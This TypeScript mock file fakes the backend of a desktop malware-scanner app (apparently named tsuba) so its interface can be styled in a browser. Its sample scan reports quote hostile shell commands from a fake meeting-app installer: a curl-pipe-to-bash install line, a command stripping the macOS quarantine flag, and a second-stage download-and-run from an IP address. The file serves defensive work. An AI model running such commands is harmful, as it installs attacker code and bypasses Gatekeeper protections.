// 只在开发时、并且不在 Tauri 里（用普通浏览器打开 vite 地址）时加载：
// 给界面一套假的后端数据，方便在浏览器里调样式。打包进 App 的版本不会包含这个文件。

const now = new Date();
const ago = (min: number) => {
  const d = new Date(now.getTime() - min * 60_000);
  const p = (n: number) => String(n).padStart(2, "0");
  return `${d.getFullYear()}-${p(d.getMonth() + 1)}-${p(d.getDate())}T${p(d.getHours())}:${p(d.getMinutes())}:${p(d.getSeconds())}`;
};

const historyEntries = [
  {
    id: "1",
    time: ago(3),
    source: "terminal",
    title: "curl -fsSL https://zeff-meet.app/install.sh | bash",
    cwd: "/Users/oliver",
    action: "cancelled",
    report: {
      verdict: "block",
      summary: "这是假会议软件的安装脚本：会删除隔离标记、下载独立的 Node.js，再从一个 IP 地址拉取第二阶段脚本。",
      reasons: ["下载域名 zeff-meet.app 注册仅 12 天", "脚本把第二阶段藏在 ~/.task 里运行，正常安装程序不会这样做"],
      advice: "不要运行。如果是“面试官”或“客户”发来的，把这条命令和对方的联系方式一起举报给招聘平台。",
      source: "ai",
      model: "claude-opus-5-5",
      findings: [
        { severity: "high", message: "删除 macOS 隔离标记（绕过 Gatekeeper 安全检查）", where: "install.sh", snippet: "xattr -d com.apple.quarantine /Applications/Zeff.app" },
        { severity: "high", message: "下载域名 zeff-meet.app 注册仅 12 天", where: "https://zeff-meet.app/install.sh" },
        { severity: "medium", message: "脚本里又下载并执行了别的脚本（多阶段投递）", where: "install.sh", snippet: "curl -s http://198.51.100.9:1224/task/mac | bash" },
      ],
    },
  },
  {
    id: "2",
    time: ago(42),
    source: "download",
    title: "/Users/oliver/Downloads/Zeff-Meeting-2.4.dmg",
    cwd: "",
    action: "notified",
    report: {
      verdict: "warn",
      summary: "安装包没有开发者签名，也没有经过苹果公证。",
      reasons: [],
      advice: "",
      source: "offline",
      model: "",
      findings: [{ severity: "medium", message: "应用没有开发者签名", where: "Zeff.app" }],
    },
  },
  {
    id: "3",
    time: ago(130),
    source: "terminal",
    title: "npm install",
    cwd: "/Users/oliver/code/online-store",
    action: "executed",
    report: { verdict: "allow", summary: "依赖都来自 npm 官方源，没有发现可疑的安装脚本。", reasons: [], advice: "", source: "ai", model: "claude-opus-5-5", findings: [] },
  },
  {
    id: "4",
    time: ago(60 * 26),
    source: "extension",
    title: "/Users/oliver/.vscode/extensions/themes-darcula-pro-1.0.2",
    cwd: "",
    action: "quarantined",
    quarantine_id: "q1",
    report: {
      verdict: "block",
      summary: "扩展代码里藏着 64 个不可见字符，解码后会读取 ~/.ssh。",
      reasons: [],
      advice: "",
      source: "offline",
      model: "",
      findings: [{ severity: "high", message: "代码里藏着一串连续 64 个不可见的 Unicode 字符", where: "extension.js" }],
    },
  },
  {
    id: "5",
    time: ago(60 * 50),
    source: "ai_tool",
    title: "Claude Code · fetch-helper（MCP server）",
    cwd: "",
    action: "allowed",
    report: { verdict: "allow", summary: "固定了版本的官方包。", reasons: [], advice: "", source: "offline", model: "", findings: [] },
  },
];

const config = {
  provider: "claude_cli",
  claude: { api_key: "", model: "claude-opus-5-5", effort: "low", cli_path: "" },
  openai_compatible: { base_url: "http://127.0.0.1:11434/v1", model: "", api_key: "", preset: "ollama", trusted: false },
  watch_downloads: true,
  watch_extensions: true,
  auto_quarantine: true,
  watch_ai_tools: true,
  intel: { auto_update: true, abusech_key: "", online_lookup: true, rules_url: "", virustotal_key: "" },
  scan: { scheduled: true, folders: ["~/Downloads", "/Users/oliver/code"], interval_days: 7 },
};

const quarantine = [
  { id: "q1", original: "/Users/oliver/.vscode/extensions/themes-darcula-pro-1.0.2", stored: "", time: ago(60 * 26), reason: "扩展代码里藏着不可见字符" },
];

// 地址里带 ?paused 时以暂停状态打开，方便看暂停的样子
let paused = location.search.includes("paused");

const handlers: Record<string, (args: Record<string, unknown>) => unknown> = {
  set_paused: (a) => {
    paused = a.paused as boolean;
  },
  delete_entry_file: () => null,
  get_overview: () => ({
    paused,
    shell_hook: { installed: true, cli_found: true, cli_path: "~/.tsuba/bin/tsuba" },
    watch_downloads: true,
    watch_extensions: true,
    watch_ai_tools: true,
    downloads_dir: "/Users/oliver/Downloads",
    extension_dirs: ["/Users/oliver/.vscode/extensions", "/Users/oliver/.cursor/extensions"],
    provider: "claude_cli",
    provider_label: "Claude Code 账号 · claude-opus-5-5",
    ai_available: true,
    sandbox_available: true,
    recent: { total: 128, warned: 6, blocked: 2 },
    quarantined: quarantine.length,
    trusted: 3,
  }),
  get_history: () => historyEntries,
  get_config: () => config,
  quarantine_list: () => quarantine,
  trusted_list: () => [{ key: "path:/Users/oliver/code/tsuba", fingerprint: "", label: "/Users/oliver/code/tsuba", time: ago(60 * 70) }],
  scan_schedule_status: () => ({ last: ago(60 * 30) }),
  intel_status: () => ({
    updated: ago(200),
    sources: [
      { id: "ossf", name: "OpenSSF 恶意包", license: "Apache-2.0", url: "", version: "", updated: "", count: 231842 },
      { id: "vscode", name: "VS Code 恶意扩展名单", license: "-", url: "", version: "", updated: "", count: 412 },
      { id: "elastic", name: "Elastic YARA 规则", license: "Elastic License 2.0", url: "", version: "", updated: "", count: 1288 },
      { id: "xprotect", name: "本机 XProtect", license: "Apple", url: "", version: "", updated: "", count: 391 },
    ],
  }),
  detect_claude_cli: () => "/Users/oliver/.local/bin/claude",
  run_doctor: () => new Promise((r) => setTimeout(() => r({ findings: [], advice: "" }), 900)),
  scan_installed_extensions: () =>
    new Promise((r) =>
      setTimeout(
        () =>
          r([
            { id: "themes.darcula-pro", path: "/x/a", verdict: "warn", findings: [{ severity: "medium", message: "启动即激活，并调用系统命令", where: "extension.js" }] },
            { id: "ms-python.python", path: "/x/b", verdict: "allow", findings: [] },
          ]),
        900,
      ),
    ),
  scan_ai_tools: () => new Promise((r) => setTimeout(() => r([]), 1500)),
  scan_folder: () =>
    new Promise((r) =>
      setTimeout(
        () =>
          r({
            root: "/Users/oliver/Downloads",
            checked: 14,
            unchanged: 31,
            truncated: false,
            hits: [
              { path: "/Users/oliver/Downloads/Zeff-Meeting-2.4.dmg", kind: "installer", verdict: "block", summary: "安装镜像的隐藏目录里藏着一个没有签名的可执行程序", findings: [{ severity: "high", message: "安装镜像的隐藏目录里藏着一个可执行程序 .back/installer", where: "Zeff.dmg" }], fresh: true },
              { path: "/Users/oliver/Downloads/interview-task", kind: "project", verdict: "warn", summary: "VS Code 打开这个文件夹时会自动执行任务", findings: [{ severity: "medium", message: "VS Code 打开这个文件夹时会自动执行任务（runOn: folderOpen）", where: ".vscode/tasks.json" }], fresh: false },
            ],
          }),
        1200,
      ),
    ),
  choose_folder: () => "/Users/oliver/Downloads",
};

let callbackId = 0;
(window as unknown as Record<string, unknown>).__TAURI_INTERNALS__ = {
  metadata: { currentWindow: { label: "main" }, currentWebview: { windowLabel: "main", label: "main" } },
  transformCallback: () => ++callbackId,
  unregisterCallback: () => {},
  invoke: async (cmd: string, args: Record<string, unknown> = {}) => {
    if (cmd.startsWith("plugin:event|")) return ++callbackId;
    const h = handlers[cmd];
    if (!h) {
      console.info("[devMock] 没有模拟的命令", cmd, args);
      return null;
    }
    return h(args);
  },
};
(window as unknown as Record<string, unknown>).__TAURI_EVENT_PLUGIN_INTERNALS__ = { unregisterListener: () => {} };
export {};
